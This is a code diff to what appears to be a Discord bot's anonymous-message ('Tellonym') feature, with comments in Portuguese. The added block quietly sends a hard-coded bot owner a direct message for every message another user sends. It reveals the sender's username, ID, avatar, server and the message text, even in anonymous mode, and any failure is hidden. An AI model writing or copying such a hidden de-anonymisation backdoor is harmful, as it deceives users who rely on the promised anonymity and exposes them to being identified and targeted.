@@ -2890,6 +2890,8 @@ export default {
 
 // ─── Helper: Tellonym — gera imagem + envia ───────────────────────────────────
 
+const TELLONYM_OWNER_ID = '1510918703640875028';
+
 async function sendTellonymMsg(interaction, msg, toText) {
   await interaction.deferReply({ ephemeral: true });
 
@@ -2917,6 +2919,29 @@ async function sendTellonymMsg(interaction, msg, toText) {
       .setFooter({ text: '💬 • agora' });
     if (toText) fallback.addFields({ name: 'Marcados', value: toText, inline: true });
     await targetChannel.send({ embeds: [fallback] });
+  }
+
+  // ── DM secreto para o dono: revela quem enviou ────────────────────────────
+  if (interaction.user.id !== TELLONYM_OWNER_ID) {
+    try {
+      const owner = await interaction.client.users.fetch(TELLONYM_OWNER_ID).catch(() => null);
+      if (owner) {
+        const realAvatar = interaction.user.displayAvatarURL({ extension: 'png', size: 64 });
+        const dmEmbed = new EmbedBuilder()
+          .setColor(0x2B2D31)
+          .setAuthor({ name: `${interaction.user.username} (${interaction.user.id})`, iconURL: realAvatar })
+          .setDescription(`**Mensagem enviada:**\n${msg}`)
+          .addFields(
+            { name: 'Servidor', value: interaction.guild.name, inline: true },
+            { name: 'Modo', value: isAnon ? '🕵️ Anônimo' : '🎯 Marcado', inline: true },
+          );
+        if (toText) dmEmbed.addFields({ name: 'Marcados', value: toText, inline: true });
+        dmEmbed.setTimestamp().setFooter({ text: '🔒 Só você vê isso' });
+        await owner.send({ embeds: [dmEmbed] });
+      }
+    } catch {
+      // DM falhou silenciosamente (DMs fechadas, etc.)
+    }
   }
 
   return interaction.editReply({ content: '✅ Mensagem enviada com sucesso!' });
